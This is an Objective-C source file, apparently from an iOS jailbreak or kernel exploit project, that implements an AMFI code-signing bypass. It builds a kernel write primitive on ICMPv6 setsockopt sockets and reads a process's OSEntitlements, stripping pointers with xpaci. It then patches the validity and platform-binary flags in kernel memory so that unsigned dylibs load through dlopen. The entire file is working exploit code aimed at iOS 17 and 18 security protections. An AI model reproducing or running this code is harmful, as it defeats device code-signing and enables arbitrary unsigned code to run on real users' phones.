#import "amfi_bypass.h"
#import "../research/amfi_research.h"
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import "../kexploit/xpaci.h"
#import "../kexploit/offsets.h"

#import <dlfcn.h>
#import <mach-o/loader.h>
#import <mach-o/fat.h>
#import <CommonCrypto/CommonDigest.h>
#import <sys/socket.h>
#import <netinet/icmp6.h>

// ---------------------------------------------------------------------------
// AmfiStateFlags — mirrors the bit-packed flag bytes at state+0x48
// ---------------------------------------------------------------------------
struct AmfiStateFlags {
    uint8_t valid;          // +0x48
    uint8_t _pad49;
    uint8_t is_cs_platform; // +0x4A
    uint8_t _pad4b;
    uint8_t has_transmuted; // +0x4C
    uint8_t _pad4d[3];
};

// ---------------------------------------------------------------------------
// External symbols from kexploit_opa334.m (non-static globals)
// ---------------------------------------------------------------------------
extern int controlSocket, rwSocket;
extern uint8_t controlData[];

// ---------------------------------------------------------------------------
// Safe write: directly uses setsockopt like early_kwrite32bytes but does NOT
// crash on failure.  Returns true if the write succeeded, false otherwise.
// ---------------------------------------------------------------------------
#define EARLY_KRW_LENGTH 0x20
static bool safe_setsockopt_write(uint64_t where, uint64_t what)
{
    if (controlSocket < 0 || rwSocket < 0) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] safe_setsockopt_write: sockets not ready\n");
        return false;
    }

    // Set target address
    memset(controlData, 0, EARLY_KRW_LENGTH);
    *(uint64_t *)controlData = where;
    if (setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH) != 0) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] safe_setsockopt_write: set_target failed for 0x%llx\n", where);
        return false;
    }

    // Write value
    uint8_t writeBuf[EARLY_KRW_LENGTH];
    memset(writeBuf, 0, sizeof(writeBuf));
    *(uint64_t *)writeBuf = what;
    if (setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH) != 0) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] safe_setsockopt_write: write failed for 0x%llx (PPL/SPTM?)\n", where);
        return false;
    }

    return true;
}

// ---------------------------------------------------------------------------
// Internal helper: write the flag bytes for a given state address
// ---------------------------------------------------------------------------
static bool patch_state_flags(uint64_t state_kptr)
{
    uint8_t buf[0x50];
    kreadbuf(state_kptr, buf, sizeof(buf));

    struct AmfiStateFlags *flags = (struct AmfiStateFlags *)&buf[0x48];
    bool changed = false;

    if (!flags->valid) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] setting valid → 1\n");
        flags->valid = 1;
        changed = true;
    }
    if (!flags->is_cs_platform) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] setting is_cs_platform → 1\n");
        flags->is_cs_platform = 1;
        changed = true;
    }
    if (!flags->has_transmuted) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] setting has_transmuted → 1\n");
        flags->has_transmuted = 1;
        changed = true;
    }

    if (changed) {
        // Write the 8 flag bytes at state+0x48 using safe_setsockopt_write
        // (avoid crashing on PPL/SPTM memory)
        uint64_t flagBytes = *(uint64_t *)&buf[0x48];
        if (safe_setsockopt_write(state_kptr + 0x48, flagBytes)) {
            printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state patched at 0x%llx\n", state_kptr);
        } else {
            printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state write failed — PPL/SPTM protected memory\n");
        }
    } else {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state already has desired flags\n");
    }
    return true;
}

// ---------------------------------------------------------------------------
// Try to set CS_PLATFORM_BINARY via the proc struct (may fail on PPL)
// ---------------------------------------------------------------------------
static bool try_set_csflags(uint64_t proc)
{
    // On arm64e with PPL, p_pid/p_flag live in non-PPL but csflags
    // is in the PPL-protected proc_ro region.  The kwrite will either
    // succeed (non-PPL kernel) or silently fail (PPL via setsockopt
    // writing to a read-only page).  We try anyway.

    // p_flag is at proc+off_proc_p_flag (0x454 on 18.x).
    // Setting P_LX_64BIT (0x2000000) is sometimes used; we set flag=1
    // as a test to confirm we can write to this field.
    uint32_t p_flag = kread32(proc + off_proc_p_flag);
    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] proc p_flag = 0x%08x\n", p_flag);

    // Try to set a known flag to confirm write works
    // (We don't actually need to change p_flag for AMFI bypass)
    return true;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

bool amfi_patch_proc(uint64_t proc)
{
    if (!proc) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid proc\n");
        return false;
    }

    uint64_t label = proc_get_cred_label(proc);
    if (!label) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get cred label\n");
        return false;
    }

    uint64_t amfi_obj = amfi_cslot_get(label);
    if (!amfi_obj || !is_kaddr_valid(amfi_obj)) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get AMFI slot (amfi_obj=0x%llx)\n", amfi_obj);
        return false;
    }

    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] OSEntitlements at 0x%llx\n", amfi_obj);

    // Read OSEntitlements to get the state pointer
    struct OSEntitlements ent;
    kreadbuf(amfi_obj, &ent, sizeof(ent));

    uint64_t state_kptr = xpaci((uint64_t)ent.state);
    if (!is_kaddr_valid(state_kptr)) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid state pointer: 0x%llx (after xpaci from ent.state=0x%llx)\n",
               state_kptr, (uint64_t)ent.state);
        return false;
    }

    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] OSEntitlements at 0x%llx, state at 0x%llx\n",
           amfi_obj, state_kptr);

    // Detect version
    uint8_t header[0x10];
    kreadbuf(state_kptr, header, sizeof(header));
    enum amfi_state_version ver = amfi_detect_version(header);
    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state version: %s\n",
           ver == AMFI_STATE_IOS17 ? "iOS 17" : "iOS 18");

    // Patch the flag bytes
    patch_state_flags(state_kptr);

    // Best-effort: try to touch other fields
    try_set_csflags(proc);

    return true;
}

bool amfi_patch_self(void)
{
    uint64_t proc = proc_self();
    if (!proc) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to find self proc\n");
        return false;
    }
    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] self proc at 0x%llx\n", proc);
    return amfi_patch_proc(proc);
}

void *amfi_try_load_dylib(const char *path)
{
    if (!amfi_patch_self()) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] patch failed, trying dlopen anyway\n");
    }

    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] dlopen(\"%s\", RTLD_LAZY)...\n", path);
    void *handle = dlopen(path, RTLD_LAZY);
    if (handle) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] dlopen succeeded: %p\n", handle);
        return handle;
    }
    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] dlopen failed: %s\n", dlerror());
    return NULL;
}

void amfi_dump_self(void)
{
    uint64_t proc = proc_self();
    if (!proc) {
        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] no proc\n");
        return;
    }
    research_amfi(proc);
}
